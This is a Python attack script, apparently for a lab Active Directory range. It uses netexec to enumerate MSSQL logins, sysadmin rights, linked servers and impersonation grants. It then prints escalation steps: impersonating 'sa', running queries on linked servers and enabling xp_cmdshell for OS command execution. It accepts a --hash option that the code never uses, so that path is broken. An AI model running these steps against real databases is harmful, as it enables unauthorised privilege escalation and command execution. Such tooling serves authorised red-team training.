#!/usr/bin/env python3
"""Probe MSSQL impersonation + linked servers. Lab / RoE only.

  python3 mssql-hop.py --host 192.168.56.22 --domain north.sevenkingdoms.local \
      --user jon.snow --password iknownothing --i-am-authorized
"""
from __future__ import annotations

import argparse
import shutil
import subprocess
import sys

QUERIES = [
    ("who", "SELECT SYSTEM_USER AS login, USER_NAME() AS uname, IS_SRVROLEMEMBER('sysadmin') AS sa"),
    ("logins", "SELECT name, sysadmin FROM sys.syslogins"),
    ("links", "SELECT name, data_source, provider, is_linked FROM sys.servers"),
    ("impersonate", "SELECT DISTINCT b.name FROM sys.server_permissions a "
     "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
     "WHERE a.permission_name = 'IMPERSONATE'"),
]


def nxc() -> str:
    return shutil.which("nxc") or shutil.which("netexec") or ""


def run_q(host: str, user: str, password: str, domain: str, sql: str) -> str:
    bin = nxc()
    if not bin:
        print("[!] nxc missing")
        return ""
    cmd = [bin, "mssql", host, "-u", user, "-p", password, "-q", sql]
    if domain:
        cmd.extend(["-d", domain])
    print("$ " + " ".join(cmd))
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=60, check=False)
    out = (p.stdout or "") + (p.stderr or "")
    sys.stdout.write(p.stdout or "")
    return out


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--i-am-authorized", action="store_true", required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--user", required=True)
    ap.add_argument("--password", default="")
    ap.add_argument("--hash", default="")
    ap.add_argument("--domain", default="")
    args = ap.parse_args()
    if not args.password and not args.hash:
        print("[!] need --password or --hash")
        return 2
    secret = args.password
    print("ADTK mssql-hop — authorized lab only")
    print("After links: EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT [LINK];")
    print("Then EXECUTE AS LOGIN = 'sa';  EXEC sp_configure 'xp_cmdshell', 1;")
    for name, sql in QUERIES:
        print(f"\n── {name} ──")
        run_q(args.host, args.user, secret, args.domain, sql)
    print("\nInteractive: impacket-mssqlclient "
          f"{args.domain}/{args.user}:{secret}@{args.host}" if args.domain else
          f"\nInteractive: impacket-mssqlclient {args.user}:{secret}@{args.host}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
